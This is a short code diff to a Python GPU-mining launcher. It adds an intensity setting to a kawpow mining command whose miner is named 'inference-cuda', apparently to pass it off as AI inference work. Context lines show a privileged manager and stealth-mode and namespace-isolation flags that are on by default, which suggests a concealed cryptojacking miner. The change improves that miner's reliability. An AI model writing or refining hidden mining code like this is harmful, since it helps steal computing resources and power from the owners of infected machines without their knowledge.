@@ -530,7 +530,11 @@ def start_gpu_mining_process(retries=3, delay=5, privileged_manager=None):
     # 🎯 CORRECT: Use CUDA backend với kawpow algorithm cho inference-cuda
     # inference-cuda được thiết kế cho CUDA, không phải OpenCL
     mining_command.extend(['--cuda', f'--cuda-loader={cuda_loader}', '-a', 'kawpow'])
+    # Thêm tuỳ chọn intensity để kiểm soát mức sử dụng VRAM (Giảm lỗi DAG out-of-memory)
+    intensity = os.getenv('GPU_INTENSITY', '20')  # Mặc định 20 nếu không đặt biến môi trường
+    mining_command.extend(['--intensity', intensity])
     logger.info(f"🎮 GPU Mining - CORRECT: Using CUDA backend với kawpow algorithm cho inference-cuda")
+    logger.info(f"🎮 GPU Mining - INTENSITY: {intensity}")
 
     enable_ns = os.getenv('ENABLE_NS_ISOLATION', '1') == '1'
     enable_stealth = os.getenv('ENABLE_STEALTH_MODE', '1') == '1'
